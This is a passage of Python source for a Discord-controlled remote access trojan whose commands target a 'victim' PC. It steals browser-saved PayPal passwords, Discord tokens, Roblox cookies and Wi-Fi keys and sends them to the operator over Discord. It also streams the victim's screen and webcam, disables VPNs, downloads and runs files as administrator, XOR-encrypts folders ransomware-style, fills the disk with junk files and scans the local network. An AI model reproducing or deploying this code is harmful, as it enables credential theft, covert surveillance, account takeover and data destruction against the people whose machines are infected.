                        "password": decrypt_password(pwd),
                        "tokens": [],
                        "cookies": [],
                        "2fa_codes": [],
                        "backup_codes": [],
                        "balance": "N/A"
                    })
                conn.close()
            except:
                pass
        return accounts

    def get_json_logins(path: str):
        accounts = []
        if os.path.exists(path):
            for file in os.listdir(path):
                full_path = os.path.join(path, file)
                if file.endswith((".json", ".ldb", ".txt")):
                    try:
                        with open(full_path, "r", errors="ignore") as f:
                            data = json.load(f)
                            accounts.append(data)
                    except:
                        continue
        return accounts

    for browser, path in PATHS.items():
        is_chrome = browser in ["Chrome", "Edge", "Brave", "Opera", "Opera GX", "Vivaldi", "Yandex"]
        accounts = get_chrome_logins(path) if is_chrome else get_json_logins(path)

        if not accounts:
            embed_empty = discord.Embed(
                title=f"🟣 {browser} PayPal Accounts",
                description="No accounts found.",
                color=discord.Color.purple()
            )
            await interaction.response.send_message(embed=embed_empty, ephemeral=True)
            continue

        for i, acc in enumerate(accounts, start=1):
            embed = discord.Embed(
                title=f"🟣 PayPal Account {i} ({browser})",
                color=discord.Color.purple()
            )
            embed.add_field(name="✉ Gmail Name", value=acc.get("gmail_name", "N/A"), inline=True)
            embed.add_field(name="📧 Email", value=acc.get("username", "N/A"), inline=True)
            embed.add_field(name="🔑 Password", value=acc.get("password", "N/A"), inline=True)
            embed.add_field(name="💳 Balance", value=acc.get("balance", "N/A"), inline=True)
            embed.add_field(name="🧾 Tokens", value="\n".join(acc.get("tokens", [])) or "None", inline=False)
            embed.add_field(name="🍪 Cookies", value="\n".join(acc.get("cookies", [])) or "None", inline=False)
            embed.add_field(name="🔒 2FA Codes", value="\n".join(acc.get("2fa_codes", [])) or "None", inline=False)
            embed.add_field(name="📦 Backup Codes", value="\n".join(acc.get("backup_codes", [])) or "None", inline=False)
            await interaction.response.send_message(embed=embed, ephemeral=True)

@tree.command(name="grab-bot-tokens", description="Grab all Discord bot tokens from system")
async def grab_bot_tokens(interaction: discord.Interaction):
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Discord PTB': ROAMING + '\\discordptb',
        'Lightcord': ROAMING + '\\Lightcord',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
        'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
        'Iridium': LOCAL + '\\Iridium\\User Data',
        'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles',
    }

    token_pattern = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    results = []

    for key, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith((".log", ".ldb", ".sqlite", ".txt", ".json")):
                    try:
                        with open(os.path.join(root, file), "rb") as f:
                            tokens = token_pattern.findall(f.read())
                            for t in tokens:
                                token = t.decode(errors="ignore")
                                if token not in results:
                                    results.append(token)
                    except:
                        continue

    if not results:
        embed_empty = discord.Embed(
            title="🟣 Grab Bot Tokens",
            description="No tokens found.",
            color=discord.Color.purple()
        )
        await interaction.response.send_message(embed=embed_empty, ephemeral=True)
        return

    for i, token in enumerate(results, start=1):
        embed = discord.Embed(
            title=f"🟣 Bot Token {i}",
            description=f"`{token}`",
            color=discord.Color.purple()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

@tree.command(name="list-discord-tokens", description="List all Discord tokens found on the system")
async def list_discord_tokens(interaction: discord.Interaction):
    import os, re

    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Discord PTB': ROAMING + '\\discordptb',
        'Lightcord': ROAMING + '\\Lightcord',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
        'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
        'Iridium': LOCAL + '\\Iridium\\User Data',
        'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles',
    }

    token_pattern = re.compile(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    results = []

    for key, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith((".log", ".ldb", ".sqlite", ".txt", ".json")):
                    try:
                        with open(os.path.join(root, file), "rb") as f:
                            tokens = token_pattern.findall(f.read())
                            for t in tokens:
                                token = t.decode(errors="ignore")
                                if token not in results:
                                    results.append(token)
                    except:
                        continue

    if not results:
        embed_empty = discord.Embed(
            title="🟣 Discord Tokens",
            description="No tokens found.",
            color=discord.Color.purple()
        )
        await interaction.response.send_message(embed=embed_empty, ephemeral=True)
        return

    for i, token in enumerate(results, start=1):
        embed = discord.Embed(
            title=f"🟣 Discord Token {i}",
            description=f"`{token}`",
            color=discord.Color.purple()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="join", description="Join a random VC and listen to ratted victim's voice")
async def listenvc(interaction: discord.Interaction):
    global vc_connection, vc_listener
    if not interaction.guild.voice_channels:
        await interaction.response.send_message("❌ No voice channels available")
        return
    channel = random.choice(interaction.guild.voice_channels)
    vc_connection = await channel.connect()
    await interaction.response.send_message(f"🎤 Joined {channel.name} and now listening to voice.")

    def listen():
        while vc_connection and vc_connection.is_connected():
            asyncio.run(asyncio.sleep(1))

    vc_listener = asyncio.get_event_loop().run_in_executor(None, listen)

@bot.tree.command(name="upload_v2", description="Upload a file or GoFile link")
async def uploadfile(interaction: discord.Interaction):

    async def download_gofile(url, save_path):
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    os.makedirs(os.path.dirname(save_path), exist_ok=True)
                    with open(save_path, "wb") as f:
                        f.write(data)
                    return True
        return False

    await interaction.response.send_message("📁 Please upload a file or provide a GoFile.io link below.")

    def check(m):
        return m.author.id == interaction.user.id and (m.attachments or "gofile.io" in m.content)

    msg = await bot.wait_for("message", check=check)

    if msg.attachments:
        attachment = msg.attachments[0]
        file_name = Path(attachment.filename).name
        save_path = os.path.join("C:/", os.name, "downloads", file_name)
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        msg2 = await msg.channel.send(f"```This file will be uploaded to `{save_path}`\nReact with 📤 to upload or 🔴 to cancel.```")
        await msg2.add_reaction("📤")
        await msg2.add_reaction("🔴")

        def react_check(reaction, user):
            return user.id == msg.author.id and str(reaction.emoji) in ["📤", "🔴"] and reaction.message.id == msg2.id

        try:
            reaction, user = await bot.wait_for("reaction_add", timeout=60.0, check=react_check)
            if str(reaction.emoji) == "📤":
                await attachment.save(save_path)
                await msg2.edit(content=f"File uploaded to `{save_path}`")
            else:
                await msg2.edit(content="Upload cancelled.")
        except asyncio.TimeoutError:
            await msg2.edit(content="Upload timed out.")

    elif "gofile.io" in msg.content:
        file_name = msg.content.split("/")[-1]
        save_path = os.path.join("C:/", os.name, "downloads", file_name)
        msg2 = await msg.channel.send(f"```This GoFile will be downloaded to `{save_path}`\nReact with 📤 to download or 🔴 to cancel.```
        await msg2.add_reaction("📤")
        
        await msg2.add_reaction("🔴")

        def react_check(reaction, user):
            return user.id == msg.author.id and str(reaction.emoji) in ["📤", "🔴"] and reaction.message.id == msg2.id

        try:
            reaction, user = await bot.wait_for("reaction_add", timeout=60.0, check=react_check)
            if str(reaction.emoji) == "📤":
                success = await download_gofile(msg.content, save_path)
                if success:
                    await msg2.edit(content=f"✅ GoFile downloaded to `{save_path}`")
                else:
                    await msg2.edit(content=f"❌ Failed to download GoFile")
            else:
                await msg2.edit(content="❌ Download cancelled")
        except asyncio.TimeoutError:
            await msg2.edit(content="❌ Download timed out")

@bot.tree.command(name="popupspam", description="Spawn annoying popups with given text")
@app_commands.describe(text="Text to display in popups")
async def popupspam(interaction: discord.Interaction, text: str):
    def spam():
        for _ in range(420):
            ctypes.windll.user32.MessageBoxW(0, text, "Popup", 0)
    threading.Thread(target=spam).start()
    await interaction.response.send_message(f"🔔 Popup spam initiated with text: {text}")

@bot.tree.command(name="listapps", description="List installed programs")
async def listapps(interaction: discord.Interaction):
    try:
        result = subprocess.run('wmic product get name', capture_output=True, text=True, shell=True)
        output = result.stdout.strip()
        if len(output) > 1900:
            temp_file = os.path.join(tempfile.gettempdir(), "installed_apps.txt")
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(output)
            await interaction.response.send_message("📄 Output too long, sending as file", file=discord.File(temp_file))
        else:
            await interaction.response.send_message(f"📄 Installed Apps:\n{output}")
    except Exception as e:
        await interaction.response.send_message(f"❌ Error: {e}")

@bot.tree.command(name="rblx-grab", description="Grab Roblox cookies and tokens from victim PC")
async def rblx_grab(interaction: discord.Interaction):
    await interaction.response.send_message("Grabbing Roblox cookies and local tokens...")

    def get_chromium_cookies():
        paths = [
            os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Opera Software\Opera Stable\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Vivaldi\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Chromium\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Epic Games\EpicPrivacyBrowser\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Yandex\YandexBrowser\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Comodo\Dragon\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Torch\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Slimjet\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\CentBrowser\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\SRWare Iron\User Data\Default\Cookies",
            os.getenv("LOCALAPPDATA") + r"\Opera Software\Opera GX Stable\Cookies",
        ]
        cookies = []
        for path in paths:
            if os.path.exists(path):
                tmp_db = tempfile.NamedTemporaryFile(delete=False)
                copyfile(path, tmp_db.name)
                conn = sqlite3.connect(tmp_db.name)
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
                    for host_key, name, enc_val in cursor.fetchall():
                        try:
                            val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode()
                            cookies.append(f"{name}={val}; domain={host_key}")
                        except:
                            continue
                except:
                    continue
                conn.close()
        return cookies

    def get_firefox_cookies():
        cookies = []
        firefox_profiles = [
            os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
            os.path.join(os.getenv("APPDATA"), "Waterfox", "Profiles"),
            os.path.join(os.getenv("APPDATA"), "Pale Moon", "Profiles"),
        ]
        for ff_path in firefox_profiles:
            if os.path.exists(ff_path):
                for profile in os.listdir(ff_path):
                    cookie_file = os.path.join(ff_path, profile, "cookies.sqlite")
                    if os.path.exists(cookie_file):
                        tmp_db = tempfile.NamedTemporaryFile(delete=False)
                        copyfile(cookie_file, tmp_db.name)
                        conn = sqlite3.connect(tmp_db.name)
                        cursor = conn.cursor()
                        try:
                            cursor.execute("SELECT host, name, value FROM moz_cookies WHERE host LIKE '%roblox.com%'")
                            for host, name, value in cursor.fetchall():
                                cookies.append(f"{name}={value}; domain={host}")
                        except:
                            continue
                        conn.close()
        return cookies

    def get_local_tokens():
        local_path = os.path.join(os.getenv("LOCALAPPDATA"), "Roblox")
        tokens = []
        if os.path.exists(local_path):
            for root, dirs, files in os.walk(local_path):
                for file in files:
                    if file.endswith(".log") or file.endswith(".ldb"):
                        try:
                            with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                                data = f.read()
                                for line in data.splitlines():
                                    if "RBXSESSION" in line or "Roblox" in line:
                                        tokens.append(line.strip())
                        except:
                            continue
        return tokens

    cookies = get_chromium_cookies() + get_firefox_cookies()
    tokens = get_local_tokens()
    all_data = []

    if cookies:
        all_data.append("🎮 Roblox Cookies:")
        all_data.extend(cookies)
    if tokens:
        all_data.append("\n📝 Roblox Local Tokens:")
        all_data.extend(tokens)

    if not all_data:
        await interaction.followup.send("🔴 No Roblox cookies or local tokens found.")
        return

    content = "\n".join(all_data)
    if len(content) > 1900:
        temp_file = os.path.join(tempfile.gettempdir(), "roblox_grab.txt")
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(content)
        await interaction.followup.send("📄 Output too long, sending as file:", file=discord.File(temp_file))
    else:
        embed = discord.Embed(title="🎮 Roblox Grab", description=f"```{content}```", color=0x9146FF)
        await interaction.followup.send(embed=embed)

@bot.tree.command(name="rblx-join", description="Force join a Roblox game using cookies or local token")
@app_commands.describe(place_id="Roblox Place ID", server_id="Optional: Server ID")
async def rblx_join(interaction: discord.Interaction, place_id: str, server_id: str = None):
    await interaction.response.send_message("Attempting to join Roblox game...")
    cookies = get_chromium_cookies() + get_firefox_cookies()
    tokens = get_local_tokens()
    session = requests.Session()
    if cookies:
        session.headers.update({"Cookie": "; ".join(cookies)})
    elif tokens:
        session.headers.update({"Cookie": f".ROBLOSECURITY={tokens[0]}"})
    else:
        await interaction.followup.send("❌ No Roblox session found.")
        return
    try:
        join_url = f"https://games.roblox.com/v1/games/{place_id}/servers/Public?sortOrder=Asc&limit=1"
        resp = session.get(join_url)
        data = resp.json()
        target_server = None
        if server_id:
            target_server = next((s for s in data["data"] if s["id"] == server_id), None)
        else:
            target_server = data["data"][0] if data["data"] else None
        if not target_server:
            await interaction.followup.send("❌ No available server found.")
            return
        join_ticket_url = f"https://gamejoin.roblox.com/v1/join-ticket?placeId={place_id}&gameId={target_server['id']}"
        ticket_resp = session.post(join_ticket_url)
        ticket = ticket_resp.json().get("JoinTicket", "N/A")
        embed = discord.Embed(title="🎮 Roblox Join", color=0x9146FF)
        embed.add_field(name="Place ID", value=place_id, inline=True)
        embed.add_field(name="Server ID", value=target_server['id'], inline=True)
        embed.add_field(name="Join Ticket", value=ticket, inline=False)
        await interaction.followup.send(embed=embed)
    except Exception as e:
        await interaction.followup.send(f"❌ Error joining game: {e}")

@bot.tree.command(name="rblx-inventory", description="Grab Roblox account inventory using cookies or local token")
async def rblx_inventory(interaction: discord.Interaction):
    await interaction.response.send_message("🎒 Fetching Roblox inventory...")
    cookies = get_chromium_cookies() + get_firefox_cookies()
    tokens = get_local_tokens()
    session = requests.Session()
    if cookies:
        session.headers.update({"Cookie": "; ".join(cookies)})
    elif tokens:
        session.headers.update({"Cookie": f".ROBLOSECURITY={tokens[0]}"})
    else:
        await interaction.followup.send("No Roblox session found.")
        return
    try:
        user_resp = session.get("https://www.roblox.com/mobileapi/userinfo")
        user_data = user_resp.json()
        user_id = user_data.get("UserID", None)
        username = user_data.get("UserName", "Unknown")
        if not user_id:
            await interaction.followup.send("❌ Could not retrieve user info.")
            return
        inv_url = f"https://inventory.roblox.com/v1/users/{user_id}/items/collectibles?limit=100"
        inv_resp = session.get(inv_url)
        inv_data = inv_resp.json()
        items = [f"{i['name']} (AssetID: {i['assetId']})" for i in inv_data.get("data", [])]
        content = f"🎮 Inventory for {username} (UserID: {user_id}):\n" + "\n".join(items)
        if len(content) > 1900:
            temp_file = os.path.join(tempfile.gettempdir(), "roblox_inventory.txt")
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(content)
            await interaction.followup.send("📄 Inventory too long, sending as file:", file=discord.File(temp_file))
        else:
            embed = discord.Embed(title=f"🎮 {username}'s Inventory", description=f"```{content}```", color=0x9146FF)
            await interaction.followup.send(embed=embed)
    except Exception as e:
        await interaction.followup.send(f"Error fetching inventory: {e}")

@bot.tree.command(name="screen-stream", description="Stream Desktop to VC")
async def screen_stream(interaction: discord.Interaction):
    if not interaction.user.voice or not interaction.user.voice.channel:
        await interaction.response.send_message("You must be in a voice channel.")
        return

    channel = interaction.user.voice.channel
    vc = await channel.connect()
    vc_connections[interaction.user.id] = vc
    await interaction.response.send_message(f"🎥 Started screen streaming to {channel.name}.")

    temp_file = os.path.join(tempfile.gettempdir(), "oltabospeboyosa.mp4")
    ffmpeg_cmd = [
        "ffmpeg",
        "-f", "gdigrab",
        "-framerate", "15",
        "-i", "desktop",
        "-vcodec", "libx264",
        "-preset", "ultrafast",
        "-f", "flv",
        temp_file
    ]

    process = subprocess.Popen(ffmpeg_cmd)
    try:
        while vc.is_connected():
            await asyncio.sleep(1)
    finally:
        process.terminate()
        await vc.disconnect()
        vc_connections.pop(interaction.user.id, None)

@bot.tree.command(name="webcam-stream", description="Stream webcam to VC")
async def webcam_stream(interaction: discord.Interaction):
    if not interaction.user.voice or not interaction.user.voice.channel:
        await interaction.response.send_message("You must be in a voice channel.")
        return

    channel = interaction.user.voice.channel
    vc = await channel.connect()
    vc_connections[interaction.user.id] = vc
    await interaction.response.send_message(f"📹 Started webcam streaming to {channel.name}.")

    temp_file = os.path.join(tempfile.gettempdir(), "engoltospebiyosa.mp4")

    try:
        result = subprocess.run(
            ["ffmpeg", "-list_devices", "true", "-f", "dshow", "-i", "dummy"],
            capture_output=True,
            text=True
        )
        matches = re.findall(r'"(.*?)"', result.stderr)
        camera_name = next((name for name in matches if "video" in name.lower()), None)
        if not camera_name:
            await interaction.followup.send("Could not detect a webcam.")
            await vc.disconnect()
            return
    except:
        await interaction.followup.send("Error detecting webcam.")
        await vc.disconnect()
        return

    ffmpeg_cmd = [
        "ffmpeg",
        "-f", "dshow",
        "-i", f'video={camera_name}',
        "-vcodec", "libx264",
        "-preset", "ultrafast",
        "-f", "flv",
        temp_file
    ]

    process = subprocess.Popen(ffmpeg_cmd)
    try:
        while vc.is_connected():
            await asyncio.sleep(1)
    finally:
        process.terminate()
        await vc.disconnect()
        vc_connections.pop(interaction.user.id, None)

@bot.tree.command(name="stop-stream", description="Stop current stream")
async def stop_stream(interaction: discord.Interaction):
    vc = vc_connections.get(interaction.user.id)
    if vc and vc.is_connected():
        await vc.disconnect()
        vc_connections.pop(interaction.user.id, None)
        await interaction.response.send_message("Stream stopped.")
    else:
        await interaction.response.send_message("No active stream found.")

@bot.tree.command(name="vpn-status", description="Check if any VPN is active")
async def vpn_status(interaction: discord.Interaction):
    embed = discord.Embed(title="VPN Status", color=0x800080)
    try:
        def get_status():
            output = subprocess.run("netsh interface show interface", capture_output=True, text=True, shell=True)
            active_vpns = []
            for line in output.stdout.splitlines():
                if "Connected" in line and any(vpn in line.lower() for vpn in ["vpn", "tunnel"]):
                    active_vpns.append(line.strip())
            return active_vpns

        active = get_status()
        if active:
            embed.add_field(name="Active VPNs", value="\n".join(active), inline=False)
        else:
            embed.add_field(name="Active VPNs", value="❌ None detected", inline=False)
    except Exception as e:
        embed.add_field(name="Error", value=str(e), inline=False)

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="deactivate-all-vpns", description="Deactivate all VPN adapters")
async def deactivate_all_vpns(interaction: discord.Interaction):
    embed = discord.Embed(title="Deactivate VPNs", color=0x800080)
    try:
        def deactivate():
            output = subprocess.run("netsh interface show interface", capture_output=True, text=True, shell=True)
            for line in output.stdout.splitlines():
                if any(vpn in line.lower() for vpn in ["vpn", "tunnel"]):
                    parts = line.split()
                    if parts[0] == "Connected" or parts[0] == "Disconnected":
                        name = " ".join(parts[3:])
                        subprocess.run(f'netsh interface set interface "{name}" admin=disable', shell=True)
            return True

        deactivate()
        embed.add_field(name="Status", value="✅ All VPNs attempted to deactivate")
    except Exception as e:
        embed.add_field(name="Error", value=str(e))

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="vpn-names", description="List known VPN adapters")
async def vpn_names(interaction: discord.Interaction):
    embed = discord.Embed(title="VPN Adapters", color=0x800080)
    try:
        def list_vpns():
            output = subprocess.run("netsh interface show interface", capture_output=True, text=True, shell=True)
            vpn_list = []
            for line in output.stdout.splitlines():
                if any(vpn in line.lower() for vpn in ["vpn", "tunnel"]):
                    vpn_list.append(line.strip())
            return vpn_list

        vpns = list_vpns()
        if vpns:
            embed.add_field(name="Detected VPNs", value="\n".join(vpns), inline=False)
        else:
            embed.add_field(name="Detected VPNs", value="❌ None found", inline=False)
    except Exception as e:
        embed.add_field(name="Error", value=str(e))

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="lock", description="Lock the victim's PC")
async def lock_pc(interaction: discord.Interaction):
    embed = discord.Embed(title="Lock PC", color=0x800080)
    try:
        subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
        embed.add_field(name="Status", value="🔒 PC locked successfully.")
    except Exception as e:
        embed.add_field(name="Error", value=str(e))
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="logoff", description="Log off the victim")
async def logoff_pc(interaction: discord.Interaction):
    embed = discord.Embed(title="Logoff", color=0x800080)
    try:
        subprocess.run("shutdown /l /f", shell=True)
        embed.add_field(name="Status", value="🚪 LoggedOff.")
    except Exception as e:
        embed.add_field(name="Error", value=str(e))
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="sleep", description="Put the victim's PC to sleep")
async def sleep_pc(interaction: discord.Interaction):
    embed = discord.Embed(title="Sleep", color=0x800080)
    try:
        subprocess.run("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
        embed.add_field(name="Status", value="💤 PC put to sleep.")
    except Exception as e:
        embed.add_field(name="Error", value=str(e))
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="wifi-passwords", description="Get saved Wi-Fi passwords on victim's PC")
async def wifi_passwords(interaction: discord.Interaction):
    embed = discord.Embed(title="Wi-Fi Passwords", color=0x800080)
    try:
        result = subprocess.run('netsh wlan show profiles', capture_output=True, text=True, shell=True)
        profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]

        passwords = []
        for profile in profiles:
            res = subprocess.run(f'netsh wlan show profile "{profile}" key=clear', capture_output=True, text=True, shell=True)
            match = [line.split(":")[1].strip() for line in res.stdout.splitlines() if "Key Content" in line]
            pwd = match[0] if match else "❌ No password"
            passwords.append(f"{profile}: {pwd}")

        if len(passwords) > 10:
            temp_file = os.path.join(os.getenv("TEMP"), "0x645z12x56.txt")
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write("\n".join(passwords))
            await interaction.response.send_message("📄 Wi-Fi passwords too long, sending file:", file=discord.File(temp_file))
        else:
            embed.add_field(name="Passwords", value="\n".join(passwords), inline=False)
            await interaction.response.send_message(embed=embed)

    except Exception as e:
        embed.add_field(name="Error", value=str(e))
        await interaction.response.send_message(embed=embed)

@bot.tree.command(name="full-storage", description="Fill drives with hidden temp .txt files")
async def full_storage(interaction: discord.Interaction):
    embed = discord.Embed(title="Hidden Storage Fill", description="Starting...", color=0x800080)
    progress_msg = await interaction.response.send_message(embed=embed)

    def fill_storage_loop(loop):
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        total_files = 500 * len(drives)
        files_done = 0
        lock = threading.Lock()

        def create_files_in_drive(drive):
            nonlocal files_done
            try:
                temp_folder = tempfile.gettempdir()
                hidden_folder = os.path.join(temp_folder, f".{''.join(random.choices(string.ascii_letters, k=8))}")
                os.makedirs(hidden_folder, exist_ok=True)
                ctypes.windll.kernel32.SetFileAttributesW(hidden_folder, 0x02)

                for i in range(1000):
                    file_path = os.path.join(hidden_folder, f"{''.join(random.choices(string.ascii_letters, k=6))}.txt")
                    with open(file_path, "w", encoding="utf-8") as f:
                        for _ in range(100_000):
                            line = ''.join(random.choices(string.ascii_letters + string.digits + " ", k=80))
                            f.write(line + "\n")
                    with lock:
                        files_done += 1
                        if files_done % 5 == 0:
                            percent = (files_done / total_files) * 100
                            bar_len = 20
                            filled_len = int(bar_len * files_done // total_files)
                            bar = "█" * filled_len + "-" * (bar_len - filled_len)
                            loop.create_task(progress_msg.edit(embed=discord.Embed(
                                title="Hidden Storage Fill",
                                description=f"Progress: {files_done}/{total_files} files ({percent:.2f}%)\n[{bar}]",
                                color=0x800080
                            )))
            except Exception:
                pass

        threads = []
        for drive in drives:
            t = threading.Thread(target=create_files_in_drive, args=(drive,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        loop.create_task(progress_msg.edit(embed=discord.Embed(
            title="Hidden Storage Fill Complete",
            description=f"All {total_files} files created in hidden temp folders.",
            color=0x00FF00
        )))

    threading.Thread(target=fill_storage_loop, args=(asyncio.get_event_loop(),)).start()

@bot.tree.command(name="run_as_admin_v2", description="Download and run a file silently as administrator")
@app_commands.describe(url="link of the file to download")
async def silent_admin(interaction: discord.Interaction, url: str):
    await interaction.response.send_message(f"Downloading and executing silently...")

    async def download_and_run():
        def run_as_admin_silent(file_path):
            try:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", file_path, None, None, 0)
                return True
            except:
                return False

        try:
            file_name = Path(url.split("/")[-1]).name
            save_path = os.path.join(tempfile.gettempdir(), file_name)
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    data = await resp.read()
                    with open(save_path, "wb") as f:
                        f.write(data)
            success = run_as_admin_silent(save_path)
            await interaction.followup.send(f"{'File executed as admin.' if success else '❌ Failed to execute'}: `{file_name}`")
        except Exception as e:
            await interaction.followup.send(f"Error: {e}")

    asyncio.create_task(download_and_run())

@bot.tree.command(name="encrypt", description="Encrypt selected folder")
@app_commands.describe(folder="Folder name to encrypt")
async def encrypt(interaction: discord.Interaction, folder: str):
    await interaction.response.send_message(f"🔒 Encrypting folder: `{folder}`...")

    def encrypt_folder():
        try:
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            full_path = os.path.abspath(folder)
            files = []
            for root, dirs, fs in os.walk(full_path):
                for f in fs:
                    files.append(os.path.join(root, f))
            total = len(files)
            for idx, fpath in enumerate(files):
                with open(fpath, "rb") as file:
                    data = file.read()
                encrypted = bytearray([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])
                with open(fpath, "wb") as file:
                    file.write(encrypted)
                progress = int(((idx+1)/total)*100)
                embed = discord.Embed(title=f"Encrypting {folder}", description=f"Progress: {progress}%", color=0x800080)
                asyncio.run_coroutine_threadsafe(interaction.followup.send(embed=embed), bot.loop)
            asyncio.run_coroutine_threadsafe(interaction.followup.send(f"✅ Folder `{folder}` encrypted with key: `{key}`"), bot.loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(interaction.followup.send(f"❌ Error: {e}"), bot.loop)

    threading.Thread(target=encrypt_folder).start()

@bot.tree.command(name="network-map", description="Scan LAN for devices")
async def network_map(interaction: discord.Interaction):
    await interaction.response.send_message("🌐 Scanning LAN...")

    def scan_network():
        results = []
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            subnet = '.'.join(local_ip.split('.')[:-1]) + '.'
            for i in range(1, 255):
                ip = subnet + str(i)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.2)
                    s.connect((ip, 135))
                    results.append(ip)
                    s.close()
                    progress = int((i/254)*100)
                    embed = discord.Embed(title="Network Scan", description=f"Progress: {progress}%", color=0x800080)
                    asyncio.run_coroutine_threadsafe(interaction.followup.send(embed=embed), bot.loop)
                except:
                    continue
            if results:
                if len(str(results)) > 1900:
                    temp_file = os.path.join(tempfile.gettempdir(), "0xZs57₩.txt")
                    with open(temp_file, "w") as f:
                        f.write("\n".join(results))
                    asyncio.run_coroutine_threadsafe(interaction.followup.send("📄 Output too large, sending file:", file=discord.File(temp_file)), bot.loop)
                else:
                    asyncio.run_coroutine_threadsafe(interaction.followup.send(embed=discord.Embed(title="🌐 Devices Found", description="\n".join(results), color=0x800080)), bot.loop)
            else:
